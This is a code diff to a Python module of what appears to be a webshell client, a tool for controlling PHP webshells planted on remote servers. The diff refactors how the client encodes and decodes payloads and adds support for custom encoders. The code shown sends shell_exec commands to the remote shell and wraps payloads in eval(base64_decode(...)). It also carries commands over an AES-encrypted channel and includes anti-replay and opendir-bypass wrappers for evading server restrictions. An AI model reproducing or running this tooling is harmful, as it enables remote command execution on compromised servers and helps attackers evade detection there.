@@ -10,14 +10,11 @@ import string
 import functools
 import uuid
 import hashlib
-import shutil
-import tempfile
-import subprocess
 import typing as t
-from pathlib import Path
 from binascii import Error as BinasciiError
 
-from . import exceptions
+from . import exceptions, custom_encoders
+from .php_decoder import decoders
 
 from ..utils.random_data import random_english_words
 from ..utils.user_agents import random_user_agent
@@ -27,10 +24,6 @@ from ..utils.cipher import (
     encrypt_aes256_cbc,
     decrypt_aes256_cbc,
 )
-from ..utils import const
-
-# utils should be imported like this to avoid circular imports
-from ..utils.nodejs_bridge import nodejs_eval
 
 from .base import (
     PHPSessionInterface,
@@ -42,63 +35,6 @@ from .base import (
 logger = logging.getLogger("core.php")
 
 user_agent = random_user_agent()
-
-
-class Decoder(t.TypedDict):
-    type: t.Literal["builtin", "antsword"]
-    phpcode: str  # 在加载失败时为空字符串
-    decode_response: t.Callable[[str], str]
-
-
-decoders: t.Dict[str, Decoder] = {
-    "raw": {
-        "type": "builtin",
-        "phpcode": "function decoder_echo_raw($s) {echo $s;}",
-        "decode_response": lambda x: x,
-    },
-    "base64": {
-        "type": "builtin",
-        "phpcode": "function decoder_echo_raw($s) {echo base64_encode($s);}",
-        "decode_response": lambda x: base64.b64decode(x).decode("utf-8"),
-    },
-}
-
-
-def get_antsword_decoder(filepath: Path) -> Decoder:
-    if shutil.which("node") is not None:
-        asenc = nodejs_eval(
-            """
-            var decoder = require(FILEPATH);
-            console.log(JSON.stringify(decoder.asoutput()));
-            """.replace(
-                "FILEPATH", repr(filepath.as_posix())
-            ),
-            [],
-        )
-        asenc = json.loads(asenc)
-        phpcode = asenc + "\nfunction decoder_echo_raw($s) {echo asenc($s);}"
-    else:
-        phpcode = ""
-
-    def decode_response(text: str):
-        return base64.b64decode(
-            nodejs_eval(
-                """
-                var decoder = require(FILEPATH);
-                var code = JSON.parse(process.argv[2]);
-                console.log(decoder.decode_buff(code).toString('base64'));
-                """.replace(
-                    "FILEPATH", repr(filepath.as_posix())
-                ),
-                [json.dumps(text)],
-            )
-        ).decode()
-
-    return {"type": "antsword", "phpcode": phpcode, "decode_response": decode_response}
-
-
-for decoder_file in const.ANTSWORD_DECODER_FOLDER.glob("*.js"):
-    decoders[f"[AntSword] {decoder_file.name}"] = get_antsword_decoder(decoder_file)
 
 
 def compress_phpcode_template(s):
@@ -638,6 +574,10 @@ php_webshell_conn_options = [
         alternatives=[
             {"name": "base64", "value": "base64"},
             {"name": "raw", "value": "raw"},
+            *[
+                {"name": custom_encoder, "value": custom_encoder}
+                for custom_encoder in custom_encoders.list_custom_encoders()
+            ],
         ],
     ),
     ConnOption(
@@ -709,19 +649,10 @@ class PHPWebshell(PHPSessionInterface):
         self.aes_session_name = None
         self.aes_key = None
 
-    def encode(self, payload: str) -> str:
-        """应用编码器"""
-        if self.encoder == "raw":
-            return payload
-        if self.encoder == "base64":
-            encoded = base64.b64encode(payload.encode()).decode()
-            return f'eval(base64_decode("{encoded}"));'
-        raise RuntimeError(f"Unsupported encoder: {self.encoder}")
+        if self.decoder not in decoders:
+            raise exceptions.ServerError(f"找不到Decoder: {self.decoder}")
 
-    def decode(self, output: str) -> str:
-        if self.decoder in decoders:
-            return decoders[self.decoder]["decode_response"](output)
-        raise exceptions.ServerError(f"Decoder not found: {self.decode}")
+    # --- 以下是Interface的实现，依赖submit函数 ---
 
     async def execute_cmd(self, cmd: str) -> str:
         return await self.submit(f"decoder_echo(shell_exec({cmd!r}));")
@@ -983,6 +914,28 @@ class PHPWebshell(PHPSessionInterface):
         except BinasciiError as exc:
             raise exceptions.PayloadOutputError("base64解码接收到的数据失败") from exc
 
+    # --- 以下是submit函数的相关实现 ---
+    # 这里实现了：
+    # - 在HTML输出中精确找到对应的php代码输出
+    # - encoder和decoder的调用
+    # - 应用防重放、opendir绕过、session暂存payload、AES加密等功能
+
+    def encode(self, payload: str) -> str:
+        """应用编码器"""
+        if self.encoder == "raw":
+            return payload
+        if self.encoder == "base64":
+            encoded = base64.b64encode(payload.encode()).decode()
+            return f'eval(base64_decode("{encoded}"));'
+        if self.encoder.endswith(".py"):
+            return custom_encoders.get_encoder(self.encoder)(payload)
+        raise exceptions.ServerError(f"找不到Encoder: {self.encoder}")
+
+    def decode(self, output: str) -> str:
+        if self.decoder in decoders:
+            return decoders[self.decoder]["decode_response"](output)
+        raise exceptions.ServerError(f"Decoder not found: {self.decode}")
+
     async def communicate_aes_key(self, submitter):
         async with self.fetchkey_lock:
             pubkey, _ = get_rsa_key()
@@ -1066,8 +1019,7 @@ class PHPWebshell(PHPSessionInterface):
             result_enc = await submitter(
                 ENCRYPTION_COMMUNICATE_PHP.replace(
                     "SESSION_NAME", string_repr(self.aes_session_name)
-                )
-                .replace("CODE_ENC", string_repr(base64_encode(payload_enc)))
+                ).replace("CODE_ENC", string_repr(base64_encode(payload_enc)))
             )
             if result_enc == "WRONG_NO_SESSION":
                 self.aes_key = None
@@ -1088,7 +1040,7 @@ class PHPWebshell(PHPSessionInterface):
 
     def get_decoder_phpcode(self):
         decoder = decoders[self.decoder]
-        if decoder["type"] == "builtin":
+        if decoder["type"] in ["builtin", "custom"]:
             return decoder["phpcode"]
         if decoder["type"] == "antsword":
             if decoder["phpcode"] == "":
@@ -1100,7 +1052,7 @@ class PHPWebshell(PHPSessionInterface):
             f"Decoder {self.decoder} {decoder['type']} is not supported"
         )
 
-    async def _submit(self, payload: str) -> str:
+    async def submit_unwrapped(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
@@ -1114,7 +1066,7 @@ class PHPWebshell(PHPSessionInterface):
             decoder=self.get_decoder_phpcode(),
         )
         payload = self.encode(payload)
-        status_code, text = await self.submit_raw(payload)
+        status_code, text = await self.submit_http(payload)
         if status_code == 404:
             raise exceptions.TargetUnreachable(
                 f"状态码404, 没有这个webshell: {status_code}"
@@ -1138,7 +1090,7 @@ class PHPWebshell(PHPSessionInterface):
 
     async def submit(self, payload: str) -> str:
         # sessionize_payload
-        submitter = self._submit
+        submitter = self.submit_unwrapped
         if self.sessionize_payload:
             submitter = self.sessionize_payload_wrapper(submitter)
         if self.antireplay:
@@ -1149,7 +1101,7 @@ class PHPWebshell(PHPSessionInterface):
             submitter = self.bypass_opendir_wrapper(submitter)
         return await submitter(payload)
 
-    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
+    async def submit_http(self, payload: str) -> t.Tuple[int, str]:
         """提交原始php payload
 
         Args:
@@ -1173,4 +1125,4 @@ class PHPWebshell(PHPSessionInterface):
         """.replace(
             "B64", string_repr(base64_encode(body))
         )
-        return await self.submit_raw(code)
+        return await self.submit_http(code)
